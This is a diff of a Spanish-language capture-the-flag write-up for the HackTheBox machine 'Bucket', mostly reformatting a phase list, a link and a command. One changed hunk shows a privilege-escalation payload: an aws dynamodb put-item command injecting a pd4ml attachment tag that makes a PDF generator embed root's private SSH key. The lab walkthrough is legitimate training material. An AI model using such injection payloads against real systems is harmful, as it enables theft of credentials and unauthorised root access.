@@ -32,9 +32,9 @@ Jmmm, no son vulnerabilidades conocidas, pero pueden llegar a ser reales, pero c
 
 **Fases** 🙄
 
-1. [Enumeración](#enumeracion)
-2. [Explotación](#explotacion)
-3. [Escalada de privilegios](#escalada-de-privilegios)
+1. [Enumeración](#enumeracion).
+2. [Explotación](#explotacion).
+3. [Escalada de privilegios](#escalada-de-privilegios).
 
 ...
 
@@ -114,7 +114,7 @@ Añadimos el dominio `bucket.htb` a nuestro `/etc/hosts`. Por dos razones, en el
 
 > Sobre el archivo `/etc/hosts`, en simples palabras sirve para relacionar/resolver los nombres de dominio con determinadas direcciones IP.
 
-* [Data sobre el archivo `/etc/hosts`](http://e-logicasoftware.com/tutoriales/tutoriales/linuxcurso/base/linux065.html).
+* [Data sobre el archivo **/etc/hosts**](http://e-logicasoftware.com/tutoriales/tutoriales/linuxcurso/base/linux065.html).
 
 ```bash
 –» cat /etc/hosts
@@ -686,8 +686,8 @@ Perfectooooooooooooooooooo, tenemos la estructura del archivo `/etc/passwd` en n
 
 ```bash
 roy@bucket:/var/www/bucket-app/files$ aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts \
->         --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///root/.ssh/id_rsa</pd4ml:attachment>
-"}}'
+--item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///root/.ssh/id_rsa</pd4ml:attachment>"}}'
+
 {
     "ConsumedCapacity": {
         "TableName": "alerts",
